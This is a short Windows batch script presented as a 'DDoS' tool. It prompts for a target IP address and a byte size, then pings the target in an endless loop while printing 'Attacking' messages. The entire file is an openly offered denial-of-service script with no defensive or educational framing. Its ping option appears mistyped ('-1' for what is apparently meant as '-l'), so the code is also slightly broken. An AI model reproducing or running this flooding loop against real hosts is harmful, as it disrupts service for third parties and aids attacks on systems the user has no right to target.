@echo off
title DDoS NearTool
color 1F



echo =====================================================
echo          Near's Tool - DoS Batch - LinkSquad
echo =====================================================
set /p targetip=IP : 
echo =====================================================
set /p data=BYTES : 
echo =====================================================
goto loop
:loop
echo Attacking %targetip% with %data% Bytes of Data
ping %targetip% -n 1 -1 %data% >nul
goto loop
